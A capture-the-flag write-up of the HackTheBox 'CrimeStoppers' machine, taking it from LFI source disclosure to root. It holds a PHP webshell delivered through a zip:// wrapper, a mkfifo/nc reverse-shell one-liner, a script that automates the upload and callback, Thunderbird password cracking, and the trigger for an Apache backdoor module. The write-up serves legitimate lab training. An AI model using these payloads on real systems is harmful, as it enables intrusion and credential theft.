---
title: HTB: CrimeStoppers
url: https://0xdf.gitlab.io/2018/06/03/htb-crimestoppers.html
date: 2018-06-03T21:22:20+00:00
difficulty: Hard [40]
os: Linux
tags: ctf, hackthebox, htb-crimestoppers, php, php-wrapper, lfi, ida, reverse-engineering
---

This is one of my favorite boxes on HTB. It’s got a good flow, and I learned a bunch doing it. We got to tackle an LFI that allows us to get source for the site, and then we turn that LFI into RCE toget access. From there we get access to a Mozilla profile, which allows privesc to a user, and from there we find someone’s already left a modified rootme apache module in place. We can RE that mod to get root on the system.

## Box Info

| Name | [CrimeStoppers](https://hackthebox.com/machines/crimestoppers)  [CrimeStoppers](https://hackthebox.com/machines/crimestoppers) [Play on HackTheBox](https://hackthebox.com/machines/crimestoppers) |
| --- | --- |
| Release Date | 06 Jan 2018 |
| Retire Date | 04 May 2024 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for CrimeStoppers |
| Radar Graph | Radar chart for CrimeStoppers |
| First Blood User | 00:41:46[Geluchat Geluchat](https://app.hackthebox.com/users/14962) |
| First Blood Root | 04:22:01[Geluchat Geluchat](https://app.hackthebox.com/users/14962) |
| Creator | [ippsec ippsec](https://app.hackthebox.com/users/3769) |

## Recon - Nmap

### Scan

Looks like we’ll be going after a http:

```

# Nmap 7.70 scan initiated Mon Apr  2 16:25:34 2018 as: nmap -sC -sV -oA nmap/initial 10.10.10.80
Nmap scan report for 10.10.10.80
Host is up (0.099s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Ubuntu))
|_http-server-header: Apache/2.4.25 (Ubuntu)
|_http-title: FBIs Most Wanted: FSociety

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Apr  2 16:25:57 2018 -- 1 IP address (1 host up) scanned in 23.62 seconds

# Nmap 7.70 scan initiated Mon Apr  2 16:26:18 2018 as: nmap -sT -p- --min-rate 5000 --max-retries 1 -oA nmap/alltcp 10.10.10.80
Nmap scan report for 10.10.10.80
Host is up (0.098s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

# Nmap done at Mon Apr  2 16:26:45 2018 -- 1 IP address (1 host up) scanned in 26.63 seconds

```

### OS version

From the `apache2` version, we can get a pretty good guess as to what version of Ubuntu is running on target. This version doesn’t show up on https://packages.ubuntu.com/search?keywords=apache2, the site we typically check. Some quick Googling finds [this page](https://launchpad.net/ubuntu/+source/apache2/2.4.25-3ubuntu1), which shows it’s for zesty. Checking out wikipedia, we see that zesty is 17.04, and, that it went end of life a few months ago.

![](https://0xdfimages.gitlab.io/img/1528113182608.png)

## Port 80 - HTTP site

### Overview

The site itself is a Mr. Robot themed site that takes tips for the FBI based on [Mr. Robot](http://www.usanetwork.com/mrrobot):
![](https://0xdfimages.gitlab.io/img/index.png)

There’s also an uploads page:
![](https://0xdfimages.gitlab.io/img/upload.png)

### Gobuster

Always be enumerating in the background - `gobuster` reveals much more of the site:

```

root@kali# gobuster -u http://10.10.10.80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x t
xt,php

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.80/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .txt,.php
=====================================================
/images (Status: 301)
/index.php (Status: 200)
/home.php (Status: 200)
/view.php (Status: 200)
/common.php (Status: 200)
/uploads (Status: 301)
/list.php (Status: 200)
/upload.php (Status: 200)
/css (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/fonts (Status: 301)
=====================================================

```

### LFI

The format of the url for the uploads page indicates the site is likely doing something like having a main page, and that page calls `include $_GET['op'] . '.php'` to bring in the other panes. That’s obviously a good place to look for LFI.

#### null terminator (fail)

If the theory above is correct, the site will append `.php` to whatever input is given. First, we can try the %00 trick: `http://10.10.10.80/index.php?op=/etc/passwd%00`

```

Are you really trying /etc/passwd!? Did we Time Travel? This isn't the 90's

```

#### get php source

```

root@kali# curl -sD - 10.10.10.80/?op=php://filter/convert.base64-encode/resource=home | head -44 | tail -1 | cut -d' ' -f1 | base64 -d > home.php
root@kali# cat home.php
<?php
include 'common.php';
?>

    <!-- Page Content -->
    <div class="container">

        <!-- Portfolio Item Heading -->
        <div class="row">
            <div class="col-lg-12">
                <h1 class="page-header">FBI Most Wanted: #fsociety
                    <small></small>
                </h1>
            </div>
        </div>
        <!-- /.row -->

        <!-- Portfolio Item Row -->
        <div class="row">
...

```

#### Find Note From Whiterose

There’s an interesting bit in `index.php`:

```

//Cookie
if(!isset($_COOKIE['admin'])) {
  setcookie('admin', '0');
  $_COOKIE['admin'] = '0';
}

```

and

```

<?php if ($_COOKIE['admin'] == 1) {
  echo '<li><a href="?op=list">List</a></li>';
  }
?>

```

`list.php` lists files uploaded from the user’s ip, and the note from whiterose:

```

<?php
include 'common.php';
?>
<div class="container">
    <h2>Upload FSociety Sightings</h2>
    <ul>
    <li><a href="?op=view&secretname=whiterose.txt">Whiterose.txt</a></li>
    <?php
        // Only show files uploaded by the client.  This is to prevent people from accessing eachothers uploads.
      foreach (scandir("uploads/" . $_SERVER['REMOTE_ADDR']) as $file) {
        if (!preg_match('(\.)', $file)) {
          echo "<li><a href=\"?op=view&secretname=" . $file . "\">" . $file . "</a></li>";
        }
      }
    ?>
    </ul>

```

![](https://0xdfimages.gitlab.io/img/list.png)

The note from whiterose:

```

Your Tip:
Hello, <br /> You guys should really learn to code, one of the GET Parameters is still vulnerable. Most will think it just leads to a Source Code disclosure but there is a chain that provides RCE. <br /> Contact WhiteRose@DarkArmy.htb for more info.

```

### upload

The source for the upload makes clear how code is uploaded (from `upload.php`):

```

if(isset($_POST['submit']) && isset($_POST['tip'])) {
        // CSRF Token to help ensure this user came from our submission form.
        if 1 == 1 { //(!empty($_POST['token'])) {
            if (hash_equals($token, $_POST['token'])) {
                $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
                // Place tips in the folder of the client IP Address.
                if (!is_dir('uploads/' . $client_ip)) {
                    mkdir('uploads/' . $client_ip, 0755, false);
                }
                $tip = $_POST['tip'];
                $secretname = genFilename();
                file_put_contents("uploads/". $client_ip . '/' . $secretname,  $tip);
                header("Location: ?op=view&secretname=$secretname");
           } else {
                print 'Hacker Detected.';
                print $token;
                die();
         }
        }

```

files are uploaded into `/uploads/[ip]/` using the random name algorithm.

The random file name is defined in `common.php`:

```

<?php
/* Stop hackers. */
if(!defined('FROM_INDEX')) die();

// If the hacker cannot control the filename, it's totally safe to let them write files... Or is it?
function genFilename() {
        return sha1($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time() . mt_rand());
}

?>

```

So we can upload arbitrary data into a file, but can’t control the name.

### Webshell

Since we can’t control the name of the file we upload, we can use a php zip filter to run a php shell.

First, create a zip with the payload:

```

root@kali# cat cmd.php
<?php echo system($_GET['cmd']); ?>
root@kali# zip shell.zip cmd.php
  adding: cmd.php (stored 0%)

```

Now, use curl to upload to the site. To do this, we’ll need the session cookie and the CSRF token, and then we’ll need to follow the location that comes back as a http 302:

```

root@kali# curl -sD - http://10.10.10.80/?op=upload -x 127.0.0.1:8080 | grep -e PHPSESSID -e 'name="token"'
Set-Cookie: PHPSESSID=0v5980ekt4tqigv8e2dtlkvp54; path=/
        <input type="text" id="token" name="token" style="display: none" value="f7ab6fe8906a56cc11bc34238be8d1f5efd324c2dceb7f216c512fdea8b17a5e" style="width:355px;" />

root@kali# curl -X POST -sD - -F "tip=<shell.zip" -F "name=a" -F "token=f7ab6fe8906a56cc11bc34238be8d1f5efd324c2dceb7f216c512fdea8b17a5e" -F "submit=Send Tip!" -x 127.0.0.1:8080 http://10.10.10.80/?op=upload -H "Referer: http://10.10.10.80/?op=upload" -H "Cookie: admin=1; PHPSESSID=0v5980ekt4tqigv8e2dtlkvp54" | grep Location
Location: ?op=view&secretname=051f7db8f8de40c856efbed60179e6e1b0b528b1

```

Two things to note here:
1. It’s important to use the `-F` (`–form) option here for the data.
2. Most references to using curl to upload files show using the `@` symbol in front of the filename. That doesn’t work in this case, because the site is expecting raw text. The curl man page explains why we’ll use the `<` character:
   > To force the ‘content’ part to be a file, prefix the file name with an @ sign. To just get the content part from a file, prefix the file name with the symbol <. The difference between @ and < is then that @ makes a file get attached in the post as a file upload, while the < makes a text field and just get the contents for that text field from a file.

The source showed that the uploads are stored in `/uploads/[ip]/`, and checking out the link for this file offers a binary file, which is a good sign. Now, using the zip filter, we have code exec by visiting `http://10.10.10.80/?op=zip://uploads/10.10.14.139/051f7db8f8de40c856efbed60179e6e1b0b528b1%23cmd&cmd=id` and seeing:

```

uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

### user.txt

With the webshell, we can get user.txt:

| url | result |
| --- | --- |
| http://10.10.10.80/?op=zip://uploads/10.10.14.139/051f7db8f8de40c856efbed60179e6e1b0b528b1%23cmd&cmd=ls%20/home | dom |
| http://10.10.10.80/?op=zip://uploads/10.10.14.139/051f7db8f8de40c856efbed60179e6e1b0b528b1%23cmd&cmd=ls%20/home/dom | user.txt |
| http://10.10.10.80/?op=zip://uploads/10.10.14.139/051f7db8f8de40c856efbed60179e6e1b0b528b1%23cmd&cmd=cat%20/home/dom/user.txt | 28a3c49d… |

## Interactive Shell

With the webshell, check for `nc -e`, but neither `nc` nor `nc.openbsd` have the option. So, use a `fifo pipe`. Visit `http://10.10.10.80/?op=zip://uploads/10.10.14.139/051f7db8f8de40c856efbed60179e6e1b0b528b1%23cmd&cmd=rm%20/tmp/d;%20mkfifo%20/tmp/d;%20cat%20/tmp/d%20|%20/bin/sh%20-i%202%3E%261|nc%2010.10.14.139%208081%20%3E%20/tmp/d`, and catch callback:

```

root@kali# nc -lnvp 8081
listening on [any] 8081 ...
connect to [10.10.14.139] from (UNKNOWN) [10.10.10.80] 50870
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ which python
$ which python3
/usr/bin/python3
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu:/var/www/html$

```

### request\_shell.sh

It’s always nice to script up the shell, especially for one with as many steps as this.

```

#!/bin/bash

if [ "$#" != "2" ]; then
    echo "$0 [zip file] [shell] [parameter] [ip] [port]"
    echo "$# given"
    exit 1
fi

zip="/tmp/payload.zip"
shell="shell"
shell_path="/tmp/${shell}.php"
param="cmd"
ip=$1
port=$2

# create zip payload
echo "[*] Creating php shell and zip file"
rm -f ${zip} ${shell_path}
echo '<?php echo "<pre>" . system($_GET['cmd']) . "</pre>"; ?>' > ${shell_path}
zip -j /tmp/payload.zip /tmp/shell.php

# Get PHPSESSID and CSRF token from upload page
echo "[*] Getting PHPSESSID and CSRF token from /?op=upload"
tokens=$(curl -sD - http://10.10.10.80/?op=upload -x 127.0.0.1:8080 | grep -e PHPSESSID -e 'name="token"' | sed 's/\n/=/g')

readarray token_array  <<< $tokens
phpid=$(echo "${token_array[0]}" | cut -d';' -f1 | cut -d'=' -f2)
csrf=$(echo "${token_array[1]}" | cut -d'"' -f10)
echo -e "[+] Tokens received:\n  PIPSESSID: ${phpid}\n  CSRF:      ${csrf}"

# Upload zip file, get location
echo "[*] Uploading zip though /?op=upload form"
location=$(curl -X POST -sD - -F "tip=<${zip}" -F "name=a" -F "token=${csrf}" -F "submit=Send Tip!" -x 127.0.0.1:8080 http://10.10.10.80?op=upload -H "Cookie: admin=1; PHPS
ESSID=${phpid}" | grep Location | cut -d' ' -f2)
secret_file=$(echo -n ${location} | cut -d'=' -f3)
echo -e "[+] File uploaded to ${location}"

# Activate callback
url="http://10.10.10.80/"
op="zip://uploads/${ip}/${secret_file//[$'\r\n']}#${shell//[$'\r\n']}"
p="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f"

echo "[*] Initiating callback to ${ip}:${port}"
a=$(curl -s -G "${url}" --data-urlencode "op=${op}" --data-urlencode "${param}=${p}" -x 127.0.0.1:8080)

```

```

root@kali# ./request_shell.sh  10.10.14.139 8081
[*] Creating php shell and zip file
  adding: shell.php (deflated 5%)
[*] Getting PHPSESSID and CSRF token from /?op=upload
[+] Tokens received:
  PIPSESSID: tdjrjl4571r7ouutpn9aae1133
  CSRF:      d8f36f072d960fcb7110a5acb45668eed3faf78e52bbd268597fdd7ed464fb49
[*] Uploading zip though /?op=upload form
[+] File uploaded to ?op=view&secretname=92ec709161beddd0906c2191ee85b0e9217c682b
[*] Initiating callback to 10.10.14.139:8081

```

```

root@kali# nc -lnvp 8081
listening on [any] 8081 ...
connect to [10.10.14.139] from (UNKNOWN) [10.10.10.80] 54104
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty;pty.spawn("bash")'
www-data@ubuntu:/var/www$ pwd
/var/www

```

## Privesc: www-data –> dom

Started off with a LinEnum.sh, but nothing particularly interesting jumped out.

`/home/dom` was open for reading, which in addition to giving `user.txt`, also revleas a `.thunderbird` directory with a profile in it.

### thunderbird - password extraction

Inside the profile, the first interesting thing is to look for passwords.

zip that entire directory and exfil it using `nc`. First, get the master password using john:

```

root@kali# /opt/JohnTheRipper/run/mozilla2john.py key3.db
key3.db:$mozilla$*3*20*1*811d3b70d608a8ad6faee44bf0568bd77ca8b2ca*11*0000000000000000000000*16*1810e3dcb634e700a4d959e35d38f282*20*11a9519177437ef38aa8bf1966d02f0d9f6a8c2f
root@kali# /opt/JohnTheRipper/run/mozilla2john.py key3.db > key3.db.john
root@kali:/opt/JohnTheRipper/run# ./john ~/hackthebox/crimestoppers-10.10.10.80/key3.db.john -w /usr/share/wordlists/rockyou.txt
Loaded 1 password hash (Mozilla, Mozilla key3.db [SHA1 3DES 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (key3.db)
1g 0:00:00:00 DONE (2018-04-08 17:34) 25.00g/s 88650p/s 88650c/s 88650C/s 123456..sss
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

Empty master password, great. There’s probably some tools to extract information from the profile, but the simplest route was to install thunderbird on kali, and then move all the files into the existing profile:

```

root@kali# mv 36jinndk.default/* 26zud94m.Default\ User/

```

Then, launch firebird, and hit alt+e to get to edit -> preferences -> security -> saved passwords -> show passwords:
![](https://0xdfimages.gitlab.io/img/dom-pass.png)
So dom’s password is `Gummer59`. And it works for her account on the box:

```

www-data@ubuntu:/var/www/html$ su dom
Password: Gummer59
dom@ubuntu:/var/www/html$

```

## Privesc: dom –> root

### email clues

dom’s email contains some clues as to what’s going on. To read it, either use Thunderbird, or cat files from the extensionless mbox files. There’s two folders which could hold mail. The `Mail/Local Folders` path has empty Trash and Unsent Messages files, but the `ImapMail/crimestoppers.htb` directory has several interesting emails.

```

dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb$ ls -l | grep -v -e msf -e '.dat'
total 64
-rw-r-xr-x 1 root root 2716 Dec 16 12:53 Drafts-1
-rw-r-xr-x 1 root root 1024 Dec 16 11:47 INBOX
-rw-r-xr-x 1 root root 7767 Dec 16 12:55 Sent-1

```

`Drafts-1` contains a draft of an email from dom to elliot, which give a clue as to where to look next:

```

dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb$ cat Drafts-1
From
FCC: imap://dom%40crimestoppers.htb@crimestoppers.htb/Sent
X-Identity-Key: id1
X-Account-Key: account1
To: elliot@ecorp.htb
From: dom <dom@crimestoppers.htb>
Subject: Potential Rootkit
Message-ID: <1f42c857-08fd-1957-8a2d-fa9a4697ffa5@crimestoppers.htb>
Date: Sat, 16 Dec 2017 12:53:18 -0800
X-Mozilla-Draft-Info: internal/draft; vcard=0; receipt=0; DSN=0; uuencode=0;
 attachmentreminder=0; deliveryformat=4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: 8bit

<html>
  <head>

    <meta http-equiv="content-type" content="text/html; charset=utf-8">
  </head>
  <body text="#000000" bgcolor="#FFFFFF">
    <p>Elliot.</p>
    <p>We got a suspicious email from the DarkArmy claiming there is a
      Remote Code Execution bug on our Webserver.  I don't trust them
      and ran rkhunter, it reported that there a rootkit installed
      called: apache_modrootme backdoor.</p>
    <p>According to my research, if this rootkit was on the server I
      should be able to run "nc localhost 80" and then type get root to
      get<br>
      nc localhost 80</p>
    <p>get root<br>
    </p>
    <p><br>
    </p>
  </body>
</html>
From - Sat Dec 16 12:53:19 2017
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
FCC: imap://dom%40crimestoppers.htb@crimestoppers.htb/Sent
X-Identity-Key: id1
X-Account-Key: account1
To: elliot@ecorp.htb
From: dom <dom@crimestoppers.htb>
Subject: Potential Rootkit
Message-ID: <1f42c857-08fd-1957-8a2d-fa9a4697ffa5@crimestoppers.htb>
Date: Sat, 16 Dec 2017 12:53:18 -0800
X-Mozilla-Draft-Info: internal/draft; vcard=0; receipt=0; DSN=0; uuencode=0;
 attachmentreminder=0; deliveryformat=4
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
Content-Type: text/html; charset=utf-8
Content-Language: en-US
Content-Transfer-Encoding: 8bit

<html>
  <head>

    <meta http-equiv="content-type" content="text/html; charset=utf-8">
  </head>
  <body text="#000000" bgcolor="#FFFFFF">
    <p>Elliot.</p>
    <p>We got a suspicious email from the DarkArmy claiming there is a
      Remote Code Execution bug on our Webserver.  I don't trust them
      and ran rkhunter, it reported that there a rootkit installed
      called: apache_modrootme backdoor.</p>
    <p>According to my research, if this rootkit was on the server I
      should be able to run "nc localhost 80" and then type get root to
      get<br>
      nc localhost 80</p>
    <p>get root<br>
    </p>
    <p><br>
    </p>
  </body>
  </html>

```

`INBOX` has a email from the Dark Army:

```

dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb$ cat INBOX
<inndk.default/ImapMail/crimestoppers.htb$ cat INBOX
From - Sat Dec 16 11:47:00 2017
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Return-Path: WhiteRose@DarkArmy.htb
Received: from [172.16.10.153] (ubuntu [172.16.10.153])
        by DESKTOP-2EA0N1O with ESMTPA
        ; Sat, 16 Dec 2017 14:46:57 -0500
To: dom@CrimeStoppers.htb
From: WhiteRose <WhiteRose@DarkArmy.htb>
Subject: RCE Vulnerability
Message-ID: <9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy.htb>
Date: Sat, 16 Dec 2017 11:46:54 -0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US

Hello,

I left note on "Leave a tip" page but no response.  Major vulnerability
exists in your site!  This gives code execution. Continue to investigate
us, we will sell exploit!  Perhaps buyer will not be so kind.

For more details place 1 million ecoins in your wallet.  Payment
instructions will be sent once we see you move money.

```

`Sent-1` has 2 emails from dom that reveal an apache rootkit installed on the host, one playing dumb to the Dark Army, and one to santiago informing him:

```

dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb$ cat Sent-1
From
Subject: Re: RCE Vulnerability
To: WhiteRose <WhiteRose@DarkArmy.htb>
References: <9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy.htb>
From: dom <dom@crimestoppers.htb>
Message-ID: <18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers.htb>
Date: Sat, 16 Dec 2017 11:49:27 -0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
In-Reply-To: <9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy.htb>
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US

If we created a bug bounty page, would you be open to using them as a
middle man?  Submit the bug, they will verify the existence and handle
the payment.

I don't know how this ecoins things work.

On 12/16/2017 11:46 AM, WhiteRose wrote:
> Hello,
>
> I left note on "Leave a tip" page but no response.  Major
> vulnerability exists in your site!  This gives code execution.
> Continue to investigate us, we will sell exploit!  Perhaps buyer will
> not be so kind.
>
> For more details place 1 million ecoins in your wallet.  Payment
> instructions will be sent once we see you move money.
>

From - Sat Dec 16 11:51:00 2017
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Subject: Re: RCE Vulnerability
To: WhiteRose <WhiteRose@DarkArmy.htb>
References: <9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy.htb>
From: dom <dom@crimestoppers.htb>
Message-ID: <18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers.htb>
Date: Sat, 16 Dec 2017 11:49:27 -0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
In-Reply-To: <9bf4236f-9487-a71a-bca7-90fa7b9e869f@DarkArmy.htb>
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit
Content-Language: en-US

If we created a bug bounty page, would you be open to using them as a
middle man?  Submit the bug, they will verify the existence and handle
the payment.

I don't know how this ecoins things work.

On 12/16/2017 11:46 AM, WhiteRose wrote:
> Hello,
>
> I left note on "Leave a tip" page but no response.  Major
> vulnerability exists in your site!  This gives code execution.
> Continue to investigate us, we will sell exploit!  Perhaps buyer will
> not be so kind.
>
> For more details place 1 million ecoins in your wallet.  Payment
> instructions will be sent once we see you move money.
>

From
Subject: Fwd: Re: RCE Vulnerability
References: <18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers.htb>
To: santiago@crimestoppres.htb
From: dom <dom@crimestoppers.htb>
X-Forwarded-Message-Id: <18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers.htb>
Message-ID: <24afa630-bf3c-5361-9c20-969bf934bd14@crimestoppers.htb>
Date: Sat, 16 Dec 2017 11:55:50 -0800
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
 Thunderbird/52.5.0
MIME-Version: 1.0
In-Reply-To: <18ea978c-f4f3-58e9-28fa-70f1a7b28664@crimestoppers.htb>
Content-Type: multipart/alternative;
Content-Type: multipart/alternative;
 boundary="------------6B48F005D20D18C4F951CD41"
Content-Language: en-US

This is a multi-part message in MIME format.
boundary="------------6B48F005D20D18C4F951CD41"
Content-Language: en-US

This is a multi-part message in MIME format.
--------------6B48F005D20D18C4F951CD41
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 8bit

Did you know anything about this?  Anyways, I'm trying to get them to
agree to an alternative form of payment where we can better track the
recipient.

Hope the DarkArmy thinks we're a bunch of dummies that don't know
anything about eCoin.

```

### apache\_modrootme

Based on dom’s note to elliot, the apache rootkit seems like a potential path to root.

It does show up in LinEnum run as dom:

```

Installed Apache modules:
Loaded Modules:
 core_module (static)
 so_module (static)
 watchdog_module (static)
 http_module (static)
 log_config_module (static)
 logio_module (static)
 version_module (static)
 unixd_module (static)
 access_compat_module (shared)
 alias_module (shared)
 auth_basic_module (shared)
 authn_core_module (shared)
 authn_file_module (shared)
 authz_core_module (shared)
 authz_host_module (shared)
 authz_user_module (shared)
 autoindex_module (shared)
 deflate_module (shared)
 dir_module (shared)
 env_module (shared)
 filter_module (shared)
 mime_module (shared)
 mpm_prefork_module (shared)
 negotiation_module (shared)
 php7_module (shared)
 reqtimeout_module (shared)
 rootme_module (shared)    <----
 setenvif_module (shared)
 status_module (shared)

```

So let’s grab a copy:

```

dom@ubuntu:~/.thunderbird/36jinndk.default/ImapMail/crimestoppers.htb$ locate rootme
/etc/apache2/mods-available/rootme.load
/etc/apache2/mods-enabled/rootme.load
/usr/lib/apache2/modules/mod_rootme.so

```

The new release of IDA free is a great way to look at this. There’s a function called `rootme_post_read_request` that seems like a good place to start:

![](https://0xdfimages.gitlab.io/img/ida-rootme_post_read_request.png)

In that function, there’s a call to `darkarmy`, followed by a call to string compare for the result of `darkarmy` and [rbx+150h]. Making a guess that that buffer holds the request, check out `darkarmy`:

![](https://0xdfimages.gitlab.io/img/darkarmy.png)

This loop takes two strings and xors their first 10 characters, which looks like this in python:

```

>>> a = 'HackTheBox'
>>> b = '\x0E\x14\x0d\x38\x3b\x0b\x0c\x27\x1b\x01'
>>> [chr(ord(x) ^ ord(y))  for x,y in zip(a,b)]
['F', 'u', 'n', 'S', 'o', 'c', 'i', 'e', 't', 'y']

```

And that string gets a root shell:

```

root@kali# nc 10.10.10.80 80
get FunSociety
rootme-0.5 DarkArmy Edition Ready
id
uid=0(root) gid=0(root) groups=0(root)
python3 -c 'import pty;pty.spawn("bash")'
root@ubuntu:/#

```

### root.txt

And with that, root.txt:

```

root@ubuntu:/# cd /root
cd /root
root@ubuntu:/root# ls
ls
Congratulations.txt  root.txt
root@ubuntu:/root# wc -c root.txt
wc -c root.txt
33 root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
91bb771...
root@ubuntu:/root# cat Congratulations.txt
cat Congratulations.txt
Hope you enjoyed the machine! The root password is crackable, but I would be surprised if anyone managed to crack it without watching the show.  But who knows it is DESCrypted after all so BruteForce is possible.

Oh and kudo's if you just SSH'd in via IPv6 once you got dom's pw :)
-Ippsec

```

## Other

### ssh as dom

As the author notes, ssh is listening:

```

www-data@ubuntu:/var/www/html$ netstat -ano | grep "LISTEN "
netstat -ano | grep "LISTEN "
tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::5355                 :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)

```

We didn’t see it in the netstat…must be being blocked… but, IPv6 isn’t:

```

www-data@ubuntu:/var/www/html$ ifconfig ens33
ifconfig ens33
ens33: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.80  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 dead:beef::250:56ff:feb9:3d9b  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:3d9b  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:3d:9b  txqueuelen 1000  (Ethernet)
        RX packets 535404  bytes 34620559 (34.6 MB)
        RX errors 0  dropped 42  overruns 0  frame 0
        TX packets 38560  bytes 30718388 (30.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

```

root@kali# ssh -6 dom@dead:beef::250:56ff:feb9:3d9b
The authenticity of host 'dead:beef::250:56ff:feb9:3d9b (dead:beef::250:56ff:feb9:3d9b)' can't be established.
ECDSA key fingerprint is SHA256:uD0ZEfB+GLhRfZnyahFwlC17R+c/JaC136Mn7HarWtU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added 'dead:beef::250:56ff:feb9:3d9b' (ECDSA) to the list of known hosts.
dom@dead:beef::250:56ff:feb9:3d9b's password:
Welcome to Ubuntu 17.04 (GNU/Linux 4.10.0-42-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Failed to connect to http://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings

Last login: Sun Jun  3 19:16:38 2018 from dead:beef:2::11da
dom@ubuntu:~$

```

Once we have a root shell, we can read the iptables configuration:

```

root@ubuntu:/etc/iptables# iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere             state RELATED,ESTABLISHED
ACCEPT     icmp --  anywhere             anywhere
ACCEPT     all  --  anywhere             anywhere
ACCEPT     tcp  --  anywhere             anywhere             state NEW tcp dpt:http
REJECT     all  --  anywhere             anywhere             reject-with icmp-host-prohibited

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

root@ubuntu:/etc/iptables# ip6tables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination
Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

```

These rules for ipv4 allow related/established connections, icmp, localhost, and new connections on port 80, and reject everything else. For ipv6, there’s nothing configured.

### Alternative path to root (without RE)

If we look at the apache2 log directory, it looks like the current logs are in `access.log`, but that the older logs are dated back to when the box was released. That is to say, it is likely that on a clean reset of the box, `access.log.1`, `access.log.2.gz`, and `access.log.3.gz` are in this same state.

```

dom@ubuntu:/var/log/apache2$ zcat access.log.3.gz | wc -l
42563
dom@ubuntu:/var/log/apache2$ zcat access.log.2.gz | wc -l
12
dom@ubuntu:/var/log/apache2$ cat access.log.1 | wc -l
11
dom@ubuntu:/var/log/apache2$ cat access.log | wc -l
16538

```

If we look at `access.log.2.gz`, we’ll see something interesting:

```

dom@ubuntu:/var/log/apache2$ zcat access.log.2.gz
::1 - - [25/Dec/2017:12:59:19 -0800] "FunSociety" 400 0 "-" "-"
::1 - - [25/Dec/2017:13:00:00 -0800] "FunSociety" 400 0 "-" "-"
